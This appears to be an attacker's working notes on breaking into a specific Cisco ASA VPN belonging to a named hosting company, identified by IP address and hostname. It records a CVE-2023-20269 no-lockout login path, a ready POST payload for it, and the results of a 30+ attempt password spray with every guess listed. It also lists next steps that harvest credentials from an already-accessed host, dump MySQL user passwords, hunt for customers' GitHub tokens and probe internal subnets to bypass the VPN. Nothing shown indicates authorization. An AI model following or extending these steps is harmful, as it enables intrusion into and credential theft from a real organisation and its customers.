# Cisco ASA 207.254.35.12 — RE & Auth Bypass Analysis

## Identity
- Hostname: ORKV10000002-FWC01.macstadium.com (from TLS cert CN)
- Full names in cert: ORKV10000002-FWC01, ORKV10000002-FWC01.macstadium.com, 207.254.35.12
- Self-signed cert, expiry 2030-08-23 (issued 2020-08-25)
- TLS: TLS 1.3, ECDHE-SECP256R1, RSA-PSS-RSAE-SHA256, AES-256-GCM
- Cert pin: `pin-sha256:ayyHAhsjaHecCem3EeDC251rYxnBHopVawehmoJPt6I=`
- Naming convention: ORKV10000002 = Orka cluster 2 (same datacenter as ORKV10000009 Harbor node)

## Version
- No version disclosed in HTTP headers, HTML, or CACHE paths
- SNMP: timeout (filtered)
- ASDM (8443): closed externally
- ASA version NOT confirmed from passive RE alone

## Tunnel-Group
- Single group: **Cisco AnyConnect VPN**
- Cookie: `tg=1Q2lzY28gQW55Q29ubmVjdCBWUE4=`
- No hidden groups; dropdown exposes only one

## Auth Endpoint — CVE-2023-20269 Path
POST `/+webvpn+/index.html` — this is the no-lockout path (differs from `/+CSCOE+/logon.html`)
openconnect also uses this path (confirmed from verbose output).

Response codes (a0 parameter in redirect URL):
- `a0=8` = invalid credentials
- `a0=4` = lockout (NOT SEEN in 30+ spray attempts — CVE-2023-20269 confirmed applicable)
- `a0=1` = success

Payload:
```
POST https://207.254.35.12/+webvpn+/index.html
Content-Type: application/x-www-form-urlencoded

username=admin&password=PASSWORD&tgroup=Cisco+AnyConnect+VPN
```

## Credential Spray Results (30+ attempts, all a0=8)
Tested usernames: admin, enable, administrator, vpn, cisco
Tested passwords: Harbor12345, admin, c0ra1t3l3c0m, MacStadium!, Orka2024!, macstadium,
  Welcome1, Cisco123, cisco123, P@ssw0rd, MacStadium1, LasVegas1, Orka1234,
  macorka, admin123, Admin123!, orkaAdmin, LasVegas, c0ra1, t3l3c0m, C0ra1T3l3c0m,
  coraltelecom, c0ra1t3l3c0m!, MacStad1um, stadium, Stadium1, macmini, MacMini1

No lockout observed across 30+ attempts — CVE-2023-20269 no-lockout path confirmed active.

## Next Steps
1. MySQL on .90 — search for VPN config: `grep -r 'vpn\|password\|cisco' /Applications/MAMP/htdocs/ /etc/ /Users/administrator/ 2>/dev/null`
2. .90 filesystem — check for AnyConnect profiles or saved credentials: `find /Users/administrator -name '*.xml' -o -name '*.plist' | xargs grep -l 'vpn\|cisco\|tunnel' 2>/dev/null`
3. Broader password candidates from MySQL data dump: `SELECT user, password FROM mysql.user` on the MAMP MySQL
4. GitHub PAT search for any macstadium/vpn config repos (if we get any customer PATs via Orka API)
5. Network capture approach: if .90 can reach the ASA, capture IKEv1/IKEv2 or SSL VPN pre-auth traffic patterns

## Alternative Bypass (no credentials needed)
- .90 is on 208.52.182.0/24 — can it reach 10.221.188.x directly without VPN?
  Test: `ping 10.221.188.20` and `nc -z 10.221.188.20 80` from .90
  If routing exists via some other path (inter-VLAN leak, management network reachable from .90 subnet), VPN is not needed.

## CVE Assessment
- CVE-2023-20269 (no-lockout): APPLICABLE — no lockout observed after 30+ attempts
- Version required for definitive CVE scoping: NOT obtained (filtered SNMP, no version in headers)
- ArcaneDoor (CVE-2024-20359/20353): status unknown — requires authenticated ASDM access or version string
